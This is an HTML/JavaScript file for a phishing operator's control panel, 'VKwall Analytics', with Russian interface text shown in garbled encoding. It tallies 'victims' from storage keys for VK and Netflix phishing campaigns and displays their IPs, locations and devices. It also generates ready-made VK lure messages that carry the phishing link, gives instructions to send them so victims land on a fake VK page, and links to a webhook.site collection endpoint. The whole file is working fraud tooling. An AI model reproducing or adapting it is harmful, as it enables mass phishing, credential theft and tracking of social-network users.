<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VKwall Analytics Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0f0f0f; 
            color: #fff; 
            font-family: 'Segoe UI', system-ui, sans-serif;
            overflow-x: hidden;
        }
        
        .dashboard {
            min-height: 100vh;
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
        }
        
        .header {
            background: rgba(74, 118, 168, 0.1);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
        }
        
        .logo { 
            color: #4a76a8; 
            font-size: 1.8rem; 
            font-weight: bold; 
        }
        
        .stats-overview {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            padding: 2rem;
        }
        
        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #4a76a8;
        }
        
        .stat-number {
            font-size: 2.5rem;
            font-weight: bold;
            color: #4a76a8;
            margin-bottom: 0.5rem;
        }
        
        .stat-label {
            color: #ccc;
            font-size: 0.9rem;
        }
        
        .controls {
            display: flex;
            gap: 1rem;
            margin: 1rem 2rem;
            flex-wrap: wrap;
        }
        
        .btn {
            background: rgba(74, 118, 168, 0.2);
            color: white;
            border: 1px solid rgba(74, 118, 168, 0.3);
            padding: 0.7rem 1.5rem;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .btn:hover {
            background: rgba(74, 118, 168, 0.3);
        }
        
        .btn.danger {
            background: rgba(220, 53, 69, 0.2);
            border-color: rgba(220, 53, 69, 0.3);
        }
        
        .btn.danger:hover {
            background: rgba(220, 53, 69, 0.3);
        }
        
        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            padding: 0 2rem 2rem;
        }
        
        @media (max-width: 1200px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }
        
        .section {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 1.5rem;
        }
        
        .section-title {
            color: #4a76a8;
            margin-bottom: 1rem;
            font-size: 1.2rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .victims-list {
            max-height: 500px;
            overflow-y: auto;
        }
        
        .victim-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 0.5rem;
            transition: all 0.3s ease;
            cursor: pointer;
        }
        
        .victim-card:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: rgba(74, 118, 168, 0.3);
        }
        
        .victim-card.active {
            background: rgba(74, 118, 168, 0.1);
            border-color: #4a76a8;
        }
        
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.5rem;
        }
        
        .victim-id {
            font-weight: bold;
            color: #4a76a8;
        }
        
        .victim-method {
            background: #4a76a8;
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.7rem;
        }
        
        .victim-time {
            color: #666;
            font-size: 0.8rem;
            margin-bottom: 0.5rem;
        }
        
        .victim-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.5rem;
            font-size: 0.9rem;
        }
        
        .info-item {
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }
        
        .data-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 1rem;
            font-size: 0.9rem;
        }
        
        .data-table th,
        .data-table td {
            padding: 0.7rem;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .data-table th {
            color: #4a76a8;
            font-weight: 600;
        }
        
        .json-viewer {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 1rem;
            max-height: 500px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            white-space: pre-wrap;
            line-height: 1.4;
        }
        
        .filter-section {
            display: flex;
            gap: 1rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }
        
        .filter-btn {
            padding: 0.5rem 1rem;
            border: 1px solid #4a76a8;
            border-radius: 6px;
            background: transparent;
            color: #4a76a8;
            cursor: pointer;
            font-size: 0.8rem;
            transition: all 0.3s ease;
        }
        
        .filter-btn.active {
            background: #4a76a8;
            color: white;
        }
        
        .method-stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            margin: 1rem 0;
        }
        
        .method-stat {
            background: rgba(255, 255, 255, 0.05);
            padding: 1rem;
            border-radius: 8px;
            text-align: center;
        }
        
        .method-value {
            font-size: 1.5rem;
            font-weight: bold;
            color: #4a76a8;
        }
        
        .method-label {
            color: #ccc;
            font-size: 0.8rem;
            margin-top: 0.5rem;
        }
        
        .empty-state {
            text-align: center;
            color: #666;
            padding: 2rem;
            font-style: italic;
        }
        
        .last-update {
            color: #666;
            font-size: 0.8rem;
            margin-top: 1rem;
            text-align: center;
        }
        
        .link-generator {
            background: rgba(255, 255, 255, 0.05);
            padding: 1.5rem;
            border-radius: 8px;
            margin-top: 1rem;
        }
        
        .url-display {
            background: #1a1a1a;
            padding: 0.7rem;
            border-radius: 6px;
            margin: 1rem 0;
            border: 1px solid #333;
            font-family: monospace;
            word-break: break-all;
        }
        
        .copy-btn {
            background: #4a76a8;
            color: white;
            border: none;
            padding: 0.3rem 0.7rem;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8rem;
            margin-left: 0.5rem;
        }
        
        .message-box {
            background: rgba(255, 255, 255, 0.03);
            padding: 1rem;
            border-radius: 6px;
            margin: 0.5rem 0;
            border-left: 3px solid #4a76a8;
        }
    </style>
</head>
<body>
    <div class="dashboard">
        <div class="header">
            <div class="logo">üìä VKwall Analytics</div>
            <div class="controls">
                <button class="btn" onclick="loadAllData()">
                    <span>üîÑ</span> –û–±–Ω–æ–≤–∏—Ç—å
                </button>
                <button class="btn" onclick="exportAllData()">
                    <span>üì§</span> –≠–∫—Å–ø–æ—Ä—Ç JSON
                </button>
                <button class="btn" onclick="openWebhook()">
                    <span>üåê</span> Webhook
                </button>
                <button class="btn danger" onclick="clearAllData()">
                    <span>üóëÔ∏è</span> –û—á–∏—Å—Ç–∏—Ç—å
                </button>
            </div>
        </div>
        
        <div class="stats-overview">
            <div class="stat-card">
                <div class="stat-number" id="totalVictims">0</div>
                <div class="stat-label">–í—Å–µ–≥–æ –∂–µ—Ä—Ç–≤</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="todayVictims">0</div>
                <div class="stat-label">–°–µ–≥–æ–¥–Ω—è</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="uniqueCountries">0</div>
                <div class="stat-label">–°—Ç—Ä–∞–Ω—ã</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="dataPoints">0</div>
                <div class="stat-label">–¢–æ—á–µ–∫ –¥–∞–Ω–Ω—ã—Ö</div>
            </div>
        </div>
        
        <div class="filter-section">
            <button class="filter-btn active" onclick="setFilter('all')">–í—Å–µ –º–µ—Ç–æ–¥—ã</button>
            <button class="filter-btn" onclick="setFilter('app')">üì± –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</button>
            <button class="filter-btn" onclick="setFilter('site')">üåê –°–∞–π—Ç</button>
            <button class="filter-btn" onclick="setFilter('click')">üé• –ö–ª–∏–∫</button>
            <button class="filter-btn" onclick="setFilter('auto')">ü§ñ –ê–≤—Ç–æ</button>
        </div>
        
        <div class="method-stats">
            <div class="method-stat">
                <div class="method-value" id="appCount">0</div>
                <div class="method-label">–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ</div>
            </div>
            <div class="method-stat">
                <div class="method-value" id="siteCount">0</div>
                <div class="method-label">–°–∞–π—Ç</div>
            </div>
            <div class="method-stat">
                <div class="method-value" id="clickCount">0</div>
                <div class="method-label">–ö–ª–∏–∫</div>
            </div>
            <div class="method-stat">
                <div class="method-value" id="autoCount">0</div>
                <div class="method-label">–ê–≤—Ç–æ</div>
            </div>
        </div>
        
        <div class="main-content">
            <div class="section">
                <div class="section-title">üë• –ü–æ—Å–ª–µ–¥–Ω–∏–µ –∂–µ—Ä—Ç–≤—ã</div>
                <div class="victims-list" id="victimsList">
                    <div class="empty-state">–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞–Ω–Ω—ã—Ö...</div>
                </div>
                <div class="last-update" id="lastUpdate"></div>
            </div>
            
            <div class="section">
                <div class="section-title">üåç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è</div>
                <div id="locationStats">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>–°—Ç—Ä–∞–Ω–∞</th>
                                <th>–ì–æ—Ä–æ–¥</th>
                                <th>–ñ–µ—Ä—Ç–≤—ã</th>
                            </tr>
                        </thead>
                        <tbody id="locationTable">
                            <tr><td colspan="3" style="text-align: center; color: #666;">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ –ª–æ–∫–∞—Ü–∏—è—Ö</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <div class="section">
                <div class="section-title">üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞</div>
                <div id="deviceStats">
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞</th>
                                <th>–ë—Ä–∞—É–∑–µ—Ä</th>
                                <th>–ö–æ–ª-–≤–æ</th>
                            </tr>
                        </thead>
                        <tbody id="deviceTable">
                            <tr><td colspan="3" style="text-align: center; color: #666;">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <div class="section">
                <div class="section-title">üîç –î–µ—Ç–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ</div>
                <div class="json-viewer" id="jsonViewer">
                    –í—ã–±–µ—Ä–∏—Ç–µ –∂–µ—Ä—Ç–≤—É –∏–∑ —Å–ø–∏—Å–∫–∞ —Å–ª–µ–≤–∞ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –¥–µ—Ç–∞–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
                </div>
            </div>
        </div>

        <!-- –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å—Å—ã–ª–æ–∫ -->
        <div class="section" style="margin: 2rem;">
            <div class="section-title">üîó –ì–µ–Ω–µ—Ä–∞—Ç–æ—Ä VK-—Å—Å—ã–ª–æ–∫</div>
            <div class="link-generator">
                <div style="margin-bottom: 1rem;">
                    <strong>–¢–µ–∫—É—â–∞—è —Ñ–∏—à–∏–Ω–≥-—Å—Å—ã–ª–∫–∞:</strong>
                    <div class="url-display" id="currentUrl">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
                </div>
                
                <button onclick="generateVKLinks()" class="btn" style="width: 100%; margin-bottom: 1rem;">
                    üé≤ –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å VK-—Å–æ–æ–±—â–µ–Ω–∏—è
                </button>
                
                <div id="vkLinksResult">
                    <!-- –ó–¥–µ—Å—å –ø–æ—è–≤—è—Ç—Å—è —Å–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å—Å—ã–ª–∫–∏ -->
                </div>
            </div>
        </div>
    </div>

    <script>
        let allVictims = [];
        let currentFilter = 'all';
        let selectedVictim = null;
        
        // –ö–ª—é—á–∏ —Ö—Ä–∞–Ω–∏–ª–∏—â–∞
        const STORAGE_KEYS = [
            'vk_phishing_victims',  // –ù–æ–≤—ã–π VK —Ñ–∏—à–∏–Ω–≥
            'vk_victims',           // –°—Ç–∞—Ä—ã–π VK
            'netflix_victims',      // Netflix
            'advanced_victims',     // –°—Ç–∞—Ä—ã–µ –¥–∞–Ω–Ω—ã–µ
            'stealth_victims'       // –°—Ç–µ–ª—Å –¥–∞–Ω–Ω—ã–µ
        ];

        // –ü–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—É—â–∏–π URL —Ñ–∏—à–∏–Ω–≥–∞
        function getCurrentPhishingUrl() {
            const currentUrl = window.location.href;
            return currentUrl.split('/dashboard.html')[0] + '/';
        }

        function loadAllData() {
            allVictims = [];
            
            // –ó–∞–≥—Ä—É–∂–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ –≤—Å–µ—Ö —Ö—Ä–∞–Ω–∏–ª–∏—â
            STORAGE_KEYS.forEach(key => {
                try {
                    const data = JSON.parse(localStorage.getItem(key) || '[]');
                    if (data && data.length > 0) {
                        console.log(`–ù–∞–π–¥–µ–Ω–æ ${data.length} –∑–∞–ø–∏—Å–µ–π –≤ ${key}`);
                        
                        // –î–æ–±–∞–≤–ª—è–µ–º –∏—Å—Ç–æ—á–Ω–∏–∫ –∫ –¥–∞–Ω–Ω—ã–º
                        const dataWithSource = data.map(item => {
                            return {
                                ...item,
                                storageKey: key,
                                displaySource: getDisplaySource(item, key)
                            };
                        });
                        
                        allVictims = [...allVictims, ...dataWithSource];
                    }
                } catch (error) {
                    console.error(`–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ ${key}:`, error);
                }
            });
            
            // –°–æ—Ä—Ç–∏—Ä—É–µ–º –ø–æ –≤—Ä–µ–º–µ–Ω–∏ (–Ω–æ–≤—ã–µ —Å–≤–µ—Ä—Ö—É)
            allVictims.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            updateDashboard();
            updateLastUpdateTime();
            updateCurrentUrl();
        }
        
        function getDisplaySource(victim, storageKey) {
            // –î–ª—è –Ω–æ–≤–æ–≥–æ VK —Ñ–∏—à–∏–Ω–≥–∞
            if (storageKey === 'vk_phishing_victims') {
                const method = victim.interaction?.method || victim.session?.method || 'unknown';
                const methodLabels = {
                    'app': 'üì± –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ',
                    'site': 'üåê –°–∞–π—Ç', 
                    'click': 'üé• –ö–ª–∏–∫',
                    'auto': 'ü§ñ –ê–≤—Ç–æ',
                    'unknown': '‚ùì –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                };
                return methodLabels[method] || methodLabels.unknown;
            }
            
            // –î–ª—è –¥—Ä—É–≥–∏—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤
            if (storageKey.includes('vk')) return 'VK';
            if (storageKey.includes('netflix')) return 'Netflix';
            return '–î—Ä—É–≥–æ–µ';
        }
        
        function setFilter(filter) {
            currentFilter = filter;
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –∞–∫—Ç–∏–≤–Ω—ã–µ –∫–Ω–æ–ø–∫–∏
            document.querySelectorAll('.filter-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            event.target.classList.add('active');
            
            updateDashboard();
        }
        
        function getFilteredVictims() {
            if (currentFilter === 'all') return allVictims;
            
            return allVictims.filter(victim => {
                const method = victim.interaction?.method || victim.session?.method || '';
                return method === currentFilter;
            });
        }
        
        function updateDashboard() {
            const victims = getFilteredVictims();
            const allTimeVictims = allVictims;
            
            // –û–±—â–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞
            document.getElementById('totalVictims').textContent = allTimeVictims.length;
            document.getElementById('todayVictims').textContent = getTodayCount(allTimeVictims);
            document.getElementById('uniqueCountries').textContent = getUniqueCountries(allTimeVictims);
            document.getElementById('dataPoints').textContent = getTotalDataPoints(allTimeVictims);
            
            // –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ –º–µ—Ç–æ–¥–∞–º
            updateMethodStats(allTimeVictims);
            
            // –°–ø–∏—Å–æ–∫ –∂–µ—Ä—Ç–≤
            updateVictimsList(victims);
            
            // –ì–µ–æ–¥–∞–Ω–Ω—ã–µ
            updateLocationStats(allTimeVictims);
            
            // –£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            updateDeviceStats(allTimeVictims);
        }
        
        function updateMethodStats(victims) {
            const methods = {
                'app': 0,
                'site': 0, 
                'click': 0,
                'auto': 0
            };
            
            victims.forEach(victim => {
                const method = victim.interaction?.method || victim.session?.method;
                if (method && methods.hasOwnProperty(method)) {
                    methods[method]++;
                }
            });
            
            document.getElementById('appCount').textContent = methods.app;
            document.getElementById('siteCount').textContent = methods.site;
            document.getElementById('clickCount').textContent = methods.click;
            document.getElementById('autoCount').textContent = methods.auto;
        }
        
        function updateVictimsList(victims) {
            const list = document.getElementById('victimsList');
            
            if (victims.length === 0) {
                list.innerHTML = '<div class="empty-state">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ —Ñ–∏–ª—å—Ç—Ä–∞</div>';
                return;
            }
            
            list.innerHTML = '';
            
            victims.slice(0, 15).forEach((victim, index) => {
                const card = document.createElement('div');
                card.className = 'victim-card' + (victim === selectedVictim ? ' active' : '');
                card.onclick = () => selectVictim(victim);
                
                const device = victim.device || {};
                const location = victim.location || {};
                const session = victim.session || {};
                
                card.innerHTML = `
                    <div class="victim-header">
                        <span class="victim-id">#${index + 1}</span>
                        <span class="victim-method">${victim.displaySource}</span>
                    </div>
                    <div class="victim-time">${formatDateTime(victim.timestamp)}</div>
                    <div class="victim-info">
                        <div class="info-item">üì± ${getPlatformName(device.platform)}</div>
                        <div class="info-item">üåê ${getBrowserName(device.userAgent)}</div>
                        <div class="info-item">üìç ${location.country || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</div>
                        <div class="info-item">üïí ${device.timezone || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}</div>
                    </div>
                    ${location.ip ? `<div style="font-size: 0.7rem; color: #666; margin-top: 0.5rem;">IP: ${location.ip}</div>` : ''}
                `;
                
                list.appendChild(card);
            });
        }
        
        function selectVictim(victim) {
            selectedVictim = victim;
            
            // –û–±–Ω–æ–≤–ª—è–µ–º –≤—ã–¥–µ–ª–µ–Ω–∏–µ
            document.querySelectorAll('.victim-card').forEach(card => {
                card.classList.remove('active');
            });
            event.currentTarget.classList.add('active');
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –¥–µ—Ç–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            showVictimDetails(victim);
        }
        
        function showVictimDetails(victim) {
            const viewer = document.getElementById('jsonViewer');
            const formattedData = JSON.stringify(victim, null, 2);
            viewer.textContent = formattedData;
        }
        
        function updateLocationStats(victims) {
            const table = document.getElementById('locationTable');
            const locations = {};
            
            victims.forEach(victim => {
                const location = victim.location;
                if (location && location.country) {
                    const key = `${location.country}-${location.city || 'Unknown'}`;
                    if (!locations[key]) {
                        locations[key] = {
                            country: location.country,
                            city: location.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ',
                            count: 0
                        };
                    }
                    locations[key].count++;
                }
            });
            
            let html = '';
            Object.values(locations)
                .sort((a, b) => b.count - a.count)
                .slice(0, 8)
                .forEach(location => {
                    html += `
                        <tr>
                            <td>${location.country}</td>
                            <td>${location.city}</td>
                            <td>${location.count}</td>
                        </tr>
                    `;
                });
            
            table.innerHTML = html || '<tr><td colspan="3" style="text-align: center; color: #666;">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ –ª–æ–∫–∞—Ü–∏—è—Ö</td></tr>';
        }
        
        function updateDeviceStats(victims) {
            const table = document.getElementById('deviceTable');
            const platforms = {};
            
            victims.forEach(victim => {
                const device = victim.device;
                if (device) {
                    const platform = getPlatformName(device.platform);
                    const browser = getBrowserName(device.userAgent);
                    const key = `${platform}-${browser}`;
                    
                    if (!platforms[key]) {
                        platforms[key] = {
                            platform: platform,
                            browser: browser,
                            count: 0
                        };
                    }
                    platforms[key].count++;
                }
            });
            
            let html = '';
            Object.values(platforms)
                .sort((a, b) => b.count - a.count)
                .slice(0, 8)
                .forEach(item => {
                    html += `
                        <tr>
                            <td>${item.platform}</td>
                            <td>${item.browser}</td>
                            <td>${item.count}</td>
                        </tr>
                    `;
                });
            
            table.innerHTML = html || '<tr><td colspan="3" style="text-align: center; color: #666;">–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö</td></tr>';
        }
        
        function getPlatformName(platform) {
            if (!platform) return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            platform = platform.toLowerCase();
            
            if (platform.includes('win')) return 'Windows';
            if (platform.includes('mac')) return 'MacOS';
            if (platform.includes('linux')) return 'Linux';
            if (platform.includes('android')) return 'Android';
            if (platform.includes('iphone') || platform.includes('ipad')) return 'iOS';
            return platform;
        }
        
        function getBrowserName(userAgent) {
            if (!userAgent) return '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            if (userAgent.includes('Opera')) return 'Opera';
            return '–î—Ä—É–≥–æ–π';
        }
        
        function getTodayCount(victims) {
            const today = new Date().toDateString();
            return victims.filter(v => 
                new Date(v.timestamp).toDateString() === today
            ).length;
        }
        
        function getUniqueCountries(victims) {
            const countries = new Set();
            victims.forEach(v => {
                if (v.location?.country) {
                    countries.add(v.location.country);
                }
            });
            return countries.size;
        }
        
        function getTotalDataPoints(victims) {
            return victims.reduce((total, victim) => {
                return total + (Object.keys(victim).length * 3);
            }, 0);
        }
        
        function formatDateTime(timestamp) {
            const date = new Date(timestamp);
            return date.toLocaleString('ru-RU', {
                day: '2-digit',
                month: '2-digit',
                year: 'numeric',
                hour: '2-digit',
                minute: '2-digit'
            });
        }
        
        function updateLastUpdateTime() {
            document.getElementById('lastUpdate').textContent = 
                `–ü–æ—Å–ª–µ–¥–Ω–µ–µ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ: ${new Date().toLocaleString('ru-RU')}`;
        }
        
        function updateCurrentUrl() {
            document.getElementById('currentUrl').textContent = getCurrentPhishingUrl();
        }
        
        function generateVKLinks() {
            const phishingUrl = getCurrentPhishingUrl();
            
            // –°–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏
            const messages = [
                `–ü—Ä–∏–≤–µ—Ç! –ü–æ—Å–º–æ—Ç—Ä–∏ —á—Ç–æ –Ω–∞—à–µ–ª –Ω–∞ —Å—Ç–µ–Ω–µ üòä\n${phishingUrl}`,
                `–ù–∞ —Å—Ç–µ–Ω–µ –∏–Ω—Ç–µ—Ä–µ—Å–Ω–æ–µ –≤–∏–¥–µ–æ –ø–æ—è–≤–∏–ª–æ—Å—å!\n${phishingUrl}`,
                `–ó–∞—Ü–µ–Ω–∏ –∑–∞–ø–∏—Å—å –Ω–∞ —Å—Ç–µ–Ω–µ! üëÄ\n${phishingUrl}`,
                `–°—Ä–æ—á–Ω–æ! –ù–∞ —Å—Ç–µ–Ω–µ –ø–æ—è–≤–∏–ª–æ—Å—å —ç—Ç–æ!\n${phishingUrl}`,
                `–≠—Ç–æ –Ω–∞–ø–æ–º–Ω–∏–ª–æ –º–Ω–µ –æ —Ç–µ–±–µ) –°–º–æ—Ç—Ä–∏ –Ω–∞ —Å—Ç–µ–Ω–µ\n${phishingUrl}`,
                `–†–µ–±—è—Ç–∞, —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ –±–æ–º–±–∞! üí•\n${phishingUrl}`,
                `–¢—ã –¥–æ–ª–∂–µ–Ω —ç—Ç–æ —É–≤–∏–¥–µ—Ç—å! üé•\n${phishingUrl}`,
                `–í–æ—Ç —ç—Ç–æ –ø–æ–≤–æ—Ä–æ—Ç! üò±\n${phishingUrl}`
            ];
            
            let resultHTML = `
                <div style="margin-bottom: 1.5rem;">
                    <h4 style="color: #4a76a8; margin-bottom: 0.5rem;">üí¨ –ì–æ—Ç–æ–≤—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è VK:</h4>
                    ${messages.map(msg => `
                        <div class="message-box">
                            <div style="color: #ccc; margin-bottom: 0.5rem; white-space: pre-line;">${msg}</div>
                            <button onclick="copyToClipboard('${msg.replace(/\n/g, '\\n')}')" class="copy-btn">–ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ</button>
                        </div>
                    `).join('')}
                </div>
                
                <div style="margin-top: 1rem; padding: 1rem; background: rgba(74, 118, 168, 0.1); border-radius: 6px;">
                    <strong>üí° –ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:</strong>
                    <ul style="color: #ccc; margin-top: 0.5rem; padding-left: 1.5rem;">
                        <li>–ö–æ–ø–∏—Ä—É–π—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–π—Ç–µ –≤ VK</li>
                        <li>–°—Å—ã–ª–∫–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–∫—Ä–æ–µ—Ç —Ñ–∏—à–∏–Ω–≥-—Å—Ç—Ä–∞–Ω–∏—Ü—É VKwall</li>
                        <li>–ñ–µ—Ä—Ç–≤–∞ —É–≤–∏–¥–∏—Ç —Ä–µ–∞–ª–∏—Å—Ç–∏—á–Ω—É—é VK-—Å—Ç—Ä–∞–Ω–∏—Ü—É</li>
                        <li>–î–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ—Å—Ç—É–ø—è—Ç –≤ —ç—Ç—É –ø–∞–Ω–µ–ª—å</li>
                    </ul>
                </div>
            `;
            
            document.getElementById('vkLinksResult').innerHTML = resultHTML;
        }
        
        function copyToClipboard(text) {
            const cleanText = text.replace(/\\n/g, '\n');
            
            navigator.clipboard.writeText(cleanText).then(() => {
                const btn = event.target;
                const originalText = btn.textContent;
                btn.textContent = '‚úÖ –°–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–æ!';
                btn.style.background = '#28a745';
                
                setTimeout(() => {
                    btn.textContent = originalText;
                    btn.style.background = '#4a76a8';
                }, 2000);
            }).catch(err => {
                console.error('–û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è:', err);
                alert('–û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è');
            });
        }
        
        function exportAllData() {
            const dataStr = JSON.stringify(allVictims, null, 2);
            const blob = new Blob([dataStr], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const link = document.createElement('a');
            link.href = url;
            link.download = `vkwall_analytics_${new Date().toISOString().split('T')[0]}.json`;
            link.click();
            URL.revokeObjectURL(url);
        }
        
        function openWebhook() {
            window.open('https://webhook.site/b7de489c-4da3-4197-b262-b5a6d9fc029b', '_blank');
        }
        
        function clearAllData() {
            if (confirm('–í–ù–ò–ú–ê–ù–ò–ï! –≠—Ç–æ —É–¥–∞–ª–∏—Ç –í–°–ï –¥–∞–Ω–Ω—ã–µ –∏–∑ –í–°–ï–• –∫–∞–º–ø–∞–Ω–∏–π. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?')) {
                STORAGE_KEYS.forEach(key => {
                    localStorage.removeItem(key);
                });
                allVictims = [];
                selectedVictim = null;
                updateDashboard();
            }
        }
        
        // –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–∞–∂–¥—ã–µ 15 —Å–µ–∫—É–Ω–¥
        setInterval(loadAllData, 15000);
        
        // –ü–µ—Ä–≤–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏
        document.addEventListener('DOMContentLoaded', function() {
            loadAllData();
            setTimeout(generateVKLinks, 1000);
        });
        
    </script>
</body>
</html>
